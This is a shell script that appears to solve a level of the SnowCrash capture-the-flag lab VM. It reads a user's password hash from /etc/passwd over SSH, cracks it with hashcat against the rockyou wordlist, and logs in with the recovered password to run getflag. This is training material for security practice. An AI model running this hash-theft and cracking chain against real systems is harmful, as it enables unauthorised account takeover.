#! /usr/bin/env sh

CURR_FILE_PATH="$(realpath "$0")"
CURR_DIR_PATH="$(dirname "$CURR_FILE_PATH")"

#############
### UTILS ###
#############

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

is_url() {
    case "$1" in
        http://*|https://*) return 0 ;;
        *) return 1 ;;
    esac
}

is_file() {
    if [ -f "$1" ]; then
        return 0;
    else
        return 1;
    fi
}

is_dir() {
    if [ -d "$1" ]; then
        return 0;
    else
        return 1;
    fi
}

download_wordlist() {
    url="$1";
    wordlist_dir="$2";

    # Handles plain files, .gz and .zip archives.

    if [ -z "$url" ] || [ -z "$wordlist_dir" ]; then
        log "Error: download_wordlist: missing arguments. You should provide <url> <wordlist_dir>." >&2;
        return 1;
    fi

    if [ ! -d "$wordlist_dir" ]; then
        log "Error: download_wordlist: '$wordlist_dir' is expected to be an accessible existing directory." >&2;
        return 1;
    fi

    filename="$(basename "$url")";
    out_file="$wordlist_dir/$filename";
    curl -L "$url" -o "$out_file" --silent --show-error --fail || return 1;

    case "$out_file" in
        *.gz)
            trap 'rm -f "$out_file"' EXIT;
            assert_gzip;
            gzip -d -f "$out_file" || return 1;
            ;;
        *.zip)
            trap 'rm -f "$out_file"' EXIT;
            assert_unzip;
            unzip -o "$out_file" -d "$wordlist_dir" || return 1;
            ;;
        *)
            ;;
    esac
}

###########
### APT ###
###########

assert_gzip() {
    if ! command -v gzip >/dev/null 2>&1; then
        log "Error: the 'gzip' command is required. Considering installing the gzip package." >&2;
        exit 1;
    fi
}

assert_unzip() {
    if ! command -v unzip >/dev/null 2>&1; then
        log "Error: the 'unzip' command is required. Considering installing the unzip package." >&2;
        exit 1;
    fi
}

##############
### DOCKER ###
##############

assert_docker() {
    if ! command -v docker >/dev/null 2>&1; then
        log "Error: the 'docker' command is required. Considering installing the docker from https://docs.docker.com/engine/install.";
        exit 1;
    fi
}

crack_hash() {
    assert_docker;

    hash_to_crack="$1";
    out_dir="$2";
    wordlist_dir="$3";

    if [ -z "$hash_to_crack" ] || [ -z "$out_dir" ] || [ -z "$wordlist_dir" ]; then
        log "Error: crack_hash: missing arguments. Expected: <hash_to_crack> <out_dir> <wordlist_dir>" >&2;
        return 1;
    fi

    shift 3;
    
    for wordlist_url in "$@"; do
        if is_url "$wordlist_url"; then
            log "Downloading - and extracting - wordlist(s) from $wordlist_url to $wordlist_dir";
            download_wordlist "$wordlist_url" "$wordlist_dir";
        fi    
    done

    if [ ! -d "$out_dir" ]; then
        log "Error: crack_hash: '$out_dir' is expected to be an accessible existing directory." >&2;
        return 1;
    fi

    docker_mapped_wordlists=""
    for filename in $(ls "$wordlist_dir"); do
        docker_mapped_wordlists="$docker_mapped_wordlists /wordlists/$filename";
    done

    if [ -f "$out_dir/cracked.txt" ]; then
        log "Hash has already been cracked. Skipping hashcat cracking attempt."
    else
        log "Attempting to CPU crack the hash '$hash_to_crack' using hashcat. This could take a while... Expect 2-5 minutes depending on the used system.";
        docker run --rm -it \
            -v "$wordlist_dir:/wordlists:ro" \
            -v "$out_dir:/out:rw" \
            dizcza/docker-hashcat:pocl \
            hashcat --attack-mode 3 --hash-type 1500 "$hash_to_crack" $docker_mapped_wordlists -o /out/cracked.txt;

        if [ ! -f "$out_dir/cracked.txt" ]; then
            log "Error: crack_hash: failed to crack the hash '$hash_to_crack'." >&2;
            return 1;
        fi
    fi

    return 0;
}

###########
### SSH ###
###########

get_ssh_socket_path() {
    fn_name="get_ssh_socket_path";
    socket_name="$1";

    if [ -z "$socket_name" ]; then
        log "Error: ${fn_name}: missing socket name" >&2;
        return 1;
    fi

    echo "${HOME}/.ssh/${socket_name}";
}

init_ssh_socket() {
    fn_name="init_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";
    password="$5";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ] || [ -z "$password" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username> <password>." >&2;
        return 1;
    fi

    if [ -S "$ssh_socket_path" ]; then
            if ssh -S "$ssh_socket_path" -O check "$host" -p "$port" >/dev/null 2>&1; then
                return 0;
            else
                rm -f "$ssh_socket_path";
            fi
    fi

    sshpass -p "$password" ssh -fNMS "$ssh_socket_path" -p "$port" "${username}@${host}"
    return $?;
}

close_ssh_socket() {
    fn_name="close_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    if ! [ -S "$ssh_socket_path" ]; then
        return 0;
    fi

    ssh -S "$ssh_socket_path" -O exit -p "$port" "${username}@${host}";
    exit_code=$?;
    rm -f "$ssh_socket_path";
    return $exit_code;
}

ssh_exec_via_socket() {
    fn_name="ssh_exec_via_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    shift 4;

    if [ $# -eq 0 ]; then
        return 0
    fi

    ssh -S "$ssh_socket_path" -p "$port" "$username@$host" "$@";
    return $?;
}

main() {
    assert_docker;

    host="localhost";
    port="4242"; # cf. port forwarding to VM 4242 => 4242.

    level01_socket_path=$(get_ssh_socket_path "snowcrash_level01_socket") || exit 1;
    level01_username="level01";
    level01_password=$(cat "$CURR_DIR_PATH/../../level00/flag");

    flag01_socket_path=$(get_ssh_socket_path "snowcrash_flag01_socket") || exit 1;
    flag01_username="flag01";
    flag01_password="";

    cracked_hashes_dir="$CURR_DIR_PATH/tshark/cracked_hashes";
    wordlists_dir="$CURR_DIR_PATH/tshark/wordlists";

    init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
    hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2");
    close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username";

    crack_hash "$hashed_password" "$cracked_hashes_dir" "$wordlists_dir" "https://weakpass.com/download/90/rockyou.txt.gz";
    if [ $? -ne 0 ]; then
        log "Error: main: failed to crack the hashed password '$hashed_password'." >&2;
        exit 1;
    fi

    cracked_password=$(cat "$out_dir/cracked.txt" | tail -n 1 | cut -d: -f2);
    flag01_password="$cracked_password";

    init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
    checkflag_str=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag");
    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
    close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username";

    flag_outpath="$CURR_DIR_PATH/../flag";
    echo "Checkflag: $checkflag";
    echo -n "$checkflag" > "$flag_outpath";
}

main "$@";
